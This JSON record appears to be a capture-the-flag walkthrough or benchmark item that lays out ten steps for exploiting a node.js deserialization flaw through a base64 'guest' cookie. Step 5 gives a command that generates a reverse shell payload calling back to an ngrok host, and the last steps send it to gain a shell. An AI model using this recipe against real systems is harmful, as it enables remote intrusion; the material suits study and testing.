{
    "AttackModel": {
        "Steps": [
            {
                "StepNumber": 1,
                "StepString": "Inspect the given source code and identify the '/guest' endpoint which deserializes the base 64 decoded 'guest' cookie"
            },
            {
                "StepNumber": 2,
                "StepString": "Recognize there's a well-known deserialization vulnerability in node.js that could lead to Remote Code Execution (RCE)"
            },
            {
                "StepNumber": 3,
                "StepString": "Understand by passing a serialized object into 'serialize.unserialize()', RCE can be achieved through a JavaScript Immediately Invoked Function Expression (IIFE)"
            },
            {
                "StepNumber": 4,
                "StepString": "Plan to execute a reverse shell payload within the function that would be fired when the data is deserialized"
            },
            {
                "StepNumber": 5,
                "StepString": "Use 'nodejsshell.py' to craft such a payload, with the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel"
            },
            {
                "StepNumber": 6,
                "StepString": "Copy the output into the function body"
            },
            {
                "StepNumber": 7,
                "StepString": "Test your payload to make sure it works"
            },
            {
                "StepNumber": 8,
                "StepString": "Encode the payload to base 64"
            },
            {
                "StepNumber": 9,
                "StepString": "Send the encoded payload through the cookie header"
            },
            {
                "StepNumber": 10,
                "StepString": "Establish a reverse shell which lets you read the flag"
            }
        ]
    }
}